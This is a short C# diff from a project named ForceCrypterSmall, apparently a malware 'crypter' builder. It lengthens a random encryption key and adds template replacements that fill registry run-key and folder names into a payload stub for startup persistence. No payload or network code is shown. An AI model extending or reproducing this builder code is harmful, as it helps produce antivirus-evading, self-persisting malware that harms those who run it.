@@ -103,7 +103,7 @@ namespace ForceCrypterSmall
         private void nsRandomPool1_ValueChanged(object sender)
         {
             //Making a random key
-            txtEncryptionKey.Text = nsRandomPool1.Value + RandomString(140);
+            txtEncryptionKey.Text = nsRandomPool1.Value + RandomString(200);
         }
 
         private void btnRandomize_Click_1(object sender, EventArgs e)
@@ -175,6 +175,8 @@ namespace ForceCrypterSmall
                 if (cbStartup.Checked)
                 {
                     //RegisteryKey
+                    boop = boop.Replace("[regfname-replace]", txtFName.Text);
+                    boop = boop.Replace("[regfiname-replace]", txtStartup.Text);
                     boop = boop.Replace("[regkey-replace]", txtRegKey.Text);
                     //FolderName
                     boop = boop.Replace("[fname-replace]", txtFName.Text);
